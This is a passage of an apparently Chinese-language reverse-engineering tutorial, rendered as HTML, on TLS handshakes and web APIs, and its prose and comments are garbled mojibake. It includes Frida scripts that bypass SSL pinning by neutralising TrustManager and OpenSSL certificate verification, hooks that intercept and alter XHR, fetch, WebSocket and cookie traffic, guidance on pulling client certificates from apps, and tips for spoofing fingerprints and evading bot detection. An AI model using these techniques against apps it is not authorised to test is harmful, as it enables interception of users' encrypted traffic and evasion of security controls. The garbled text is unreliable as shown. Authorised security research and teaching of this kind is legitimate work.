            Hook <code>javax.net.ssl.X509TrustManager.checkServerTrusted</code>ï¼Œè®©å…¶æ°¸è¿œä¸æŠ›å¼‚å¸¸ã€‚</p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1">// Frida Hook ç¤ºä¾‹</span>
<span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">TrustManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">&quot;javax.net.ssl.X509TrustManager&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">TrustManager</span><span class="p">.</span><span class="nx">checkServerTrusted</span><span class="p">.</span><span class="nx">implementation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">chain</span><span class="p">,</span><span class="w"> </span><span class="nx">authType</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[+] Bypassing SSL Pinning - TrustManager&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// ç›´æ¥è¿”å›ï¼Œä¸æŠ›å‡ºå¼‚å¸¸</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">});</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>Native å±‚ (so ä¿®æ”¹)</strong>:<br />
            Hook SSL åº“çš„éªŒè¯å‡½æ•°ï¼Œå¦‚ <code>SSL_CTX_set_custom_verify</code> æˆ–ç›´æ¥ Hook æ¡æ‰‹ç»“æœã€‚</p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1">// Hook OpenSSL</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="s2">&quot;libssl.so&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SSL_CTX_set_verify&quot;</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[+] SSL_CTX_set_verify called&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// å°† verify_callback è®¾ç½®ä¸º NULLï¼Œç¦ç”¨éªŒè¯</span>
<span class="w">        </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ptr</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
          </div>
        </li>
      </ul>

      <h3 id="3-åŒå‘è®¤è¯-mutual-tls-mtls">3. åŒå‘è®¤è¯ (Mutual TLS / mTLS)</h3>

      <p>æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯ä¹Ÿå‡ºç¤ºè¯ä¹¦ã€‚</p>

      <ul>
        <li><strong>è¡¨ç°</strong>: æŠ“åŒ…çœ‹åˆ°æœåŠ¡å™¨è¿”å› <code>400 Bad Request (No Client Certificate)</code>ã€‚</li>
        <li><strong>é€†å‘</strong>: éœ€è¦ä» APK/IPA æˆ–è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿä¸­æå–å‡º <code>.p12</code> æˆ– <code>.bks</code> å®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶å¯¼å…¥åˆ° Charles/Burp
          ä¸­ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>TLS æ¡æ‰‹æ˜¯ HTTP ä¹‹å‰çš„â€œæš—å·å¯¹æ¥â€ã€‚</p>

      <ul>
        <li><strong>æ­£å‘</strong>: ä¿è¯æ•°æ®ä¸è¢«çªƒå¬å’Œç¯¡æ”¹ã€‚</li>
        <li><strong>é€†å‘</strong>: æˆ‘ä»¬å°±æ˜¯é‚£ä¸ªâ€œçªƒå¬è€…â€å’Œâ€œç¯¡æ”¹è€…â€ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„å·¥ä½œé‡å¿ƒæ˜¯è®©è‡ªå·±æˆä¸ºå®¢æˆ·ç«¯ä¿¡ä»»çš„â€œä¸­é—´äººâ€ï¼ˆç»•è¿‡è¯ä¹¦æ ¡éªŒ/Pinningï¼‰ï¼Œæˆ–è€…ç›´æ¥æ‹¿åˆ°é€šä¿¡å¯†é’¥ï¼ˆHook OpenSSLï¼‰ã€‚
        </li>
      </ul>

    </div>

    <div class="section" id="01-Foundations-web-api-and-ajax">
      <h2>14. Web API And Ajax</h2>
      <h1 id="web-api-ä¸-ajax">Web API ä¸ Ajax</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Web API å’Œ Ajax æ˜¯ç°ä»£ Web åº”ç”¨çš„æ ¸å¿ƒã€‚å¯¹äºé€†å‘å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œç†è§£è¿™äº›æŠ€æœ¯æ˜¯æ‹¦æˆªç½‘ç»œè¯·æ±‚ã€åˆ†ææ•°æ®æµå‘ä»¥åŠç»•è¿‡æŸäº›å®‰å…¨æ£€æµ‹çš„åŸºç¡€ã€‚</p>

      <hr />

      <h2 id="ajax-ä¸ç½‘ç»œè¯·æ±‚">Ajax ä¸ç½‘ç»œè¯·æ±‚</h2>

      <h3 id="1-xmlhttprequest-xhr">1. XMLHttpRequest (XHR)</h3>

      <p>XHR æ˜¯ä¼ ç»Ÿçš„ Ajax å®ç°æ–¹å¼ï¼Œè™½ç„¶ Fetch API è¶Šæ¥è¶Šæµè¡Œï¼Œä½†è®¸å¤šè€é¡¹ç›®å’Œæ··æ·†ä»£ç ï¼ˆå¦‚åŠ å¯†åº“ï¼‰ä»åœ¨ä½¿ç”¨ XHRã€‚</p>

      <h4 id="xhr-ç”Ÿå‘½å‘¨æœŸä¸çŠ¶æ€">XHR ç”Ÿå‘½å‘¨æœŸä¸çŠ¶æ€</h4>

      <p>XHR å¯¹è±¡é€šè¿‡ <code>readyState</code> å±æ€§è¡¨ç¤ºè¯·æ±‚çŠ¶æ€ï¼š</p>

      <ul>
        <li><code>0 (UNSENT)</code>: å¯¹è±¡å·²åˆ›å»ºï¼Œä½†æœªè°ƒç”¨ <code>open()</code>ã€‚</li>
        <li><code>1 (OPENED)</code>: <code>open()</code> å·²è°ƒç”¨ã€‚</li>
        <li><code>2 (HEADERS_RECEIVED)</code>: <code>send()</code> å·²è°ƒç”¨ï¼Œå¤´éƒ¨å’ŒçŠ¶æ€å¯ç”¨ã€‚</li>
        <li><code>3 (LOADING)</code>: ä¸‹è½½ä¸­ï¼Œ<code>responseText</code> åŒ…å«éƒ¨åˆ†æ•°æ®ã€‚</li>
        <li><code>4 (DONE)</code>: ä¸‹è½½æ“ä½œå®Œæˆã€‚</li>
      </ul>

      <h4 id="reverse-engineering-context-hook-xhr">[Reverse Engineering Context] Hook XHR</h4>

      <p>åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ Hook <code>open</code> å’Œ <code>send</code> æ–¹æ³•æ¥æ‹¦æˆªè¯·æ±‚å‚æ•°å’Œä¿®æ”¹è¯·æ±‚ä½“ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">originalOpen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">originalSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="w">  </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="nx">method</span><span class="p">,</span>
<span class="w">    </span><span class="nx">url</span><span class="p">,</span>
<span class="w">    </span><span class="k">async</span><span class="p">,</span>
<span class="w">    </span><span class="nx">user</span><span class="p">,</span>
<span class="w">    </span><span class="nx">password</span>
<span class="w">  </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è®°å½•æˆ–ä¿®æ”¹ URL/Method</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">;</span><span class="w"> </span><span class="c1">// ä¿å­˜ URL ä¾› send ä½¿ç”¨</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[XHR Open] </span><span class="si">${</span><span class="nx">method</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è°ƒç”¨åŸå§‹æ–¹æ³•</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalOpen</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">  </span><span class="p">};</span>

<span class="w">  </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è®°å½•æˆ–ä¿®æ”¹è¯·æ±‚ä½“</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[XHR Send] to </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="si">}</span><span class="sb">:`</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// å¦‚æœéœ€è¦ç›‘å¬å“åº”ï¼Œå¯ä»¥ç»‘å®š onreadystatechange</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;readystatechange&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
<span class="w">          </span><span class="sb">`[XHR Response] from </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">responseURL</span><span class="si">}</span><span class="sb">:`</span><span class="p">,</span>
<span class="w">          </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSend</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">  </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="2-fetch-api">2. Fetch API</h3>

      <p>Fetch æ˜¯åŸºäº Promise çš„æ–°ä¸€ä»£ç½‘ç»œè¯·æ±‚ APIï¼Œè¯­æ³•æ›´ç®€æ´ï¼Œå¤„ç†æ–¹å¼ä¸ XHR ä¸åŒã€‚</p>

      <h4 id="åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://api.example.com/data&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;POST&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span><span class="w"> </span><span class="p">},</span>
<span class="w">  </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">}),</span>
<span class="p">})</span>
<span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span><span class="w"> </span><span class="c1">// è§£æ JSON</span>
<span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
</code></pre>
      </div>

      <h4 id="reverse-engineering-context-hook-fetch">[Reverse Engineering Context] Hook Fetch</h4>

      <p>Fetch æ˜¯å…¨å±€ <code>window</code> å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼ŒHook èµ·æ¥ç›¸å¯¹ç®€å•ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>

<span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[Fetch] </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// ä¿®æ”¹è¯·æ±‚å‚æ•°</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;/api/sign&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="c1">// options.headers[&#39;X-Modified&#39;] = &#39;true&#39;;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// è°ƒç”¨åŸå§‹ fetch</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ‹¦æˆªå“åº”ï¼ˆæ³¨æ„ï¼šresponseæµåªèƒ½è¯»å–ä¸€æ¬¡ï¼Œéœ€è¦cloneï¼‰</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">    </span><span class="nx">clone</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">((</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[Fetch Response]`</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">  </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="3-websocket">3. WebSocket</h3>

      <p>WebSocket æä¾›å…¨åŒå·¥é€šä¿¡é€šé“ã€‚é€†å‘ä¸­å¸¸ç”¨äºåˆ†æå®æ—¶æ•°æ®æµï¼ˆå¦‚ç›´æ’­å¼¹å¹•ã€è‚¡ç¥¨è¡Œæƒ…ã€æ¸¸æˆæ•°æ®ï¼‰ã€‚</p>

      <h4 id="reverse-engineering-context-hook-websocket">[Reverse Engineering Context] Hook WebSocket</h4>

      <p>æ‹¦æˆª WebSocket çš„ <code>send</code> (å‘åŒ…) å’Œ <code>onmessage</code> (æ”¶åŒ…)ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">;</span>

<span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[WebSocket] Connecting to </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Hook å‘é€</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">originalSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[WebSocket Send]`</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSend</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook æ¥æ”¶</span>
<span class="w">    </span><span class="c1">// WebSocket çš„ onmessage å±æ€§é€šå¸¸åœ¨å®ä¾‹åˆ›å»ºåè¢«èµ‹å€¼</span>
<span class="w">    </span><span class="c1">// ä½¿ç”¨ Object.defineProperty æ‹¦æˆª setter æ˜¯ä¸€ç§æ›´é€šç”¨çš„æ–¹æ³•</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">onmessageVal</span><span class="p">;</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">ws</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;onmessage&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">configurable</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">      </span><span class="nx">enumerable</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">      </span><span class="nx">get</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">onmessageVal</span><span class="p">;</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">      </span><span class="nx">set</span><span class="p">(</span><span class="nx">fn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">onmessageVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[WebSocket Recv]`</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nx">fn</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">      </span><span class="p">},</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">ws</span><span class="p">;</span>
<span class="w">  </span><span class="p">};</span>

<span class="w">  </span><span class="c1">// å¤åˆ¶åŸå‹é“¾ï¼Œä¿æŒ instanceof æ£€æŸ¥é€šè¿‡</span>
<span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">.</span><span class="nx">prototype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
<span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">.</span><span class="nx">CONNECTING</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">OriginalWebSocket</span><span class="p">.</span><span class="nx">CONNECTING</span><span class="p">;</span>
<span class="w">  </span><span class="c1">// ... å…¶ä»–é™æ€å±æ€§</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸ç”¨-web-api">å¸¸ç”¨ Web API</h2>

      <h3 id="1-storage-api-å­˜å‚¨">1. Storage API (å­˜å‚¨)</h3>

      <p>Web åº”ç”¨å¸¸ç”¨æœ¬åœ°å­˜å‚¨æ¥ä¿å­˜ Session IDã€Token æˆ–åŠ å¯†å¯†é’¥ã€‚</p>

      <ul>
        <li><strong>localStorage / sessionStorage</strong>: é”®å€¼å¯¹å­˜å‚¨ã€‚
          <ul>
            <li>é€†å‘å…³æ³¨ç‚¹ï¼š<code>localStorage.getItem('token')</code>ã€‚</li>
          </ul>
        </li>
        <li><strong>Cookie</strong>: è¿™ä¸ªæ¯”è¾ƒç‰¹æ®Šï¼Œé€šå¸¸ä½œä¸º HTTP å¤´å‘é€ã€‚
          <ul>
            <li>é€†å‘å…³æ³¨ç‚¹ï¼š<code>document.cookie</code> çš„è¯»å†™ã€‚Hook <code>document.cookie</code> çš„ setter å¯ä»¥è¿½è¸ª Cookie çš„ç”Ÿæˆä½ç½®ã€‚
            </li>
          </ul>
        </li>
      </ul>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook Cookie Setter</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Cookie Set]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// åœ¨æ­¤å¤„æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ</span>
<span class="w">    </span><span class="c1">// å®é™…è®¾ç½® cookie çš„é€»è¾‘éœ€è¦å°å¿ƒå¤„ç†ï¼Œé˜²æ­¢æ— é™é€’å½’æˆ–å¤±æ•ˆ</span>
<span class="w">    </span><span class="c1">// é€šå¸¸åœ¨ hook ä¸­ä¸çœŸæ­£è®¾ç½®ï¼Œæˆ–è€…é€šè¿‡ document-&gt;proto-&gt;cookie setter</span>
<span class="w">  </span><span class="p">},</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="2-canvas-api-æŒ‡çº¹è¯†åˆ«">2. Canvas API (æŒ‡çº¹è¯†åˆ«)</h3>

      <p>Canvas é™¤äº†ç»˜å›¾ï¼Œå¸¸ç”¨äº <strong>Canvas Fingerprinting</strong>ï¼ˆå¸†å¸ƒæŒ‡çº¹ï¼‰ã€‚ç½‘ç«™åœ¨ hidden canvas ä¸Šç»˜åˆ¶ç‰¹å®šæ–‡æœ¬å’Œå›¾å½¢ï¼Œè½¬æ¢æˆ
        base64ï¼Œä¸åŒæµè§ˆå™¨/ç¡¬ä»¶æ¸²æŸ“å‡ºçš„åƒç´ æœ‰å¾®å°å·®å¼‚ï¼Œç”Ÿæˆå”¯ä¸€ IDã€‚</p>

      <ul>
        <li><strong>é€†å‘ç‰¹å¾</strong>: æœç´¢ <code>toDataURL</code> æˆ– <code>getImageData</code>ã€‚</li>
        <li><strong>å¯¹æŠ—</strong>: éšæœºåŒ– canvas æ¸²æŸ“ç»“æœï¼Œæˆ–å›ºå®šè¿”å›ç‰¹å®šæŒ‡çº¹ã€‚</li>
      </ul>

      <h3 id="3-navigator-api-ç¯å¢ƒæ£€æµ‹">3. Navigator API (ç¯å¢ƒæ£€æµ‹)</h3>

      <p>ç”¨äºæ£€æµ‹æµè§ˆå™¨ç¯å¢ƒï¼Œåçˆ¬è™«å¸¸æ£€æŸ¥ä»¥ä¸‹å±æ€§ï¼š</p>

      <ul>
        <li><code>navigator.userAgent</code>: æµè§ˆå™¨ UAã€‚</li>
        <li><code>navigator.webdriver</code>: <strong>é‡ç‚¹</strong>ï¼Œè‡ªåŠ¨åŒ–å·¥å…·ï¼ˆSelenium/Puppeteerï¼‰é€šå¸¸ä¸º <code>true</code>ã€‚</li>
        <li><code>navigator.plugins</code>: æ’ä»¶åˆ—è¡¨ã€‚</li>
        <li><code>navigator.languages</code>: è¯­è¨€ã€‚</li>
      </ul>

      <hr />

      <h2 id="è·¨åŸŸé€šä¿¡-postmessage">è·¨åŸŸé€šä¿¡ (postMessage)</h2>

      <p><code>window.postMessage</code> å…è®¸ä¸åŒæºçš„çª—å£ï¼ˆå¦‚ iframe å’Œçˆ¶é¡µé¢ï¼‰é€šä¿¡ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å‘é€æ¶ˆæ¯</span>
<span class="nx">otherWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">targetOrigin</span><span class="p">);</span>

<span class="c1">// æ¥æ”¶æ¶ˆæ¯</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s2">&quot;http://trusted.com&quot;</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
